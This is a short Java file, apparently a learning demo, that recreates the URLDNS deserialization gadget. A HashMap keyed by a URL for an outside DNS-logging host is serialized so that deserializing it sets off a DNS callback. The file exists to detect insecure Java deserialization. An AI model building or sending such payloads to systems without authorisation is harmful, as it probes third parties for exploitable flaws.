package com.testdemo;

import java.io.*;
import java.lang.reflect.Field;
import java.net.*;
import java.util.HashMap;

public class yurldns {
    final static String url = "http://qpoojhhygl.dnstunnel.run";
    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        //Avoid DNS resolution during payload creation
        //Since the field <code>java.net.URL.handler</code> is transient, it will not be part of the serialized payload.

        URLStreamHandler handler = new SilentURLStreamHandler();

        HashMap ht = new HashMap(); // HashMap that will contain the URL
        URL u = new URL(null, url, handler); // URL to use as the Key
//        System.out.println(u);
        ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.
        Class clazz = Class.forName("java.net.URL");
        Field field = clazz.getDeclaredField("hashCode");
        field.setAccessible(true);
        field.set(u,-1);

//        System.out.println(ht);
//        serialize(ht);
        Object ob = unserialize("ser.bin");
//        System.out.println(ob);
    }


    static class SilentURLStreamHandler extends URLStreamHandler {

        protected URLConnection openConnection(URL u) throws IOException {
            return null;
        }

        protected synchronized InetAddress getHostAddress(URL u) {
            return null;
        }
    }

    public static void serialize(Object o) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(o);
    }
    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }


}
